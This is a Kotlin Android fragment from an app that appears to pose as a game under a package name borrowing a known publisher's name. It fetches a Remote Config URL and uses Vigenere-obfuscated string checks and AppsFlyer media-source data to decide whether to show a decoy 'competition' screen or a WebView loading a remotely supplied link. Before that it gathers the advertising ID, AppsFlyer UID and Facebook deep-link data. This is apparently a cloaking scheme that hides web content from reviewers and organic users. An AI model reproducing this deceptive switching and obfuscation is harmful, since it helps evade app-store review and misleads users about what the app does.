package com.kakaogames.gd.ui

import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.kakaogames.gd.R
import com.kakaogames.gd.databinding.FragmentStartBinding
import com.kakaogames.gd.utils.isInternetAvailable
import com.kakaogames.gd.utils.vigenere
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class StartFragment : Fragment() {
    @Inject
    lateinit var appsFlyerLiveData: MutableLiveData<MutableMap<String, Any>>

    private var _binding: FragmentStartBinding? = null
    private val binding get() = _binding!!

    private val viewModel: StartViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentStartBinding.inflate(layoutInflater)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        initLoading()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }


    private fun initLoading() {
        binding.pBar.visibility = View.VISIBLE
        val link = viewModel.getCachedLink()
        Log.d("TAG", "initLoading:$link ")

        if (isInternetAvailable(requireContext())) {
            if (link != "") {
                navigateToWebViewFragment(link)
                binding.pBar.visibility = View.GONE
            } else {
                startInitFirebase()
            }
        } else {
            showNoInternetDialog()
            binding.pBar.visibility = View.GONE
        }
    }

    private fun startInitFirebase() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val settings =
            FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(2500)
                .build()
        remoteConfig.setConfigSettingsAsync(settings)
        remoteConfig.fetchAndActivate().addOnCompleteListener {
            val organic = remoteConfig.getBoolean(resources.getString(R.string.firebase_organic))
            val url = remoteConfig.getString(resources.getString(R.string.firebase_root_url))
            viewModel.setOrganicAndUrl(organic, url)
            if (url.contains("jhfz".vigenere())) {
                beginMainWork()
            } else {
                navigateToCompetitionFragment()
            }
        }
    }

    private fun beginMainWork() = lifecycleScope.launch(Dispatchers.IO) {
        initFB()
        getGoogleAID()
        lifecycleScope.launch(Dispatchers.Main) {
            setAppsFlyerParams()
        }
    }

    private fun initFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(requireContext()) {
            val uri = it?.targetUri
            viewModel.setDeepLink(uri)
        }
    }

    private fun getGoogleAID() {
        val advertisingIdClient = AdvertisingIdClient.getAdvertisingIdInfo(requireContext())
        viewModel.setGoogleAID(advertisingIdClient.id.toString())
    }

    private fun setAppsFlyerParams() {
        val appsUID = AppsFlyerLib.getInstance().getAppsFlyerUID(requireContext())
        viewModel.setAppsFlyerUID(appsUID)

        appsFlyerLiveData.observe(viewLifecycleOwner) {
            for (inform in it) {
                when (inform.key) {
                    "ct_edadug".vigenere() -> {
                        viewModel.setAppsFlyerStatus(inform.value.toString())
                    }
                    "eoyzasgb".vigenere() -> {
                        viewModel.setAppsFlyerCampaign(inform.value.toString())
                    }
                    "ospsa_coixcq".vigenere() -> {
                        viewModel.setAppsFlyerMediaSource(inform.value.toString())
                    }
                    "ct_oraxnsr".vigenere() -> {
                        viewModel.setAppsFlyerChannel(inform.value.toString())
                    }
                }
            }
            collectWebLink()
        }
    }


    private fun collectWebLink() {
        val organicAccess = viewModel.getOrganicAccess()
        val mediaSource = viewModel.getMediaSource()
        if (organicAccess == false && mediaSource == "qfsknsc".vigenere()) {
            navigateToCompetitionFragment()
            return
        }
        val link = viewModel.collectWebLink(requireContext())
        navigateToWebViewFragment(link)
    }


    private fun navigateToWebViewFragment(link: String) {
        val action = StartFragmentDirections.actionStartFragmentToWebViewFragment(link)
        findNavController().navigate(action)
    }

    private fun navigateToCompetitionFragment() {
        val action = StartFragmentDirections.actionGlobalCompetitionFragment()
        findNavController().navigate(action)
    }


    private fun showNoInternetDialog(): AlertDialog =
        MaterialAlertDialogBuilder(requireContext()).setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                initLoading()
                dialog.dismiss()
            }
            .show()
}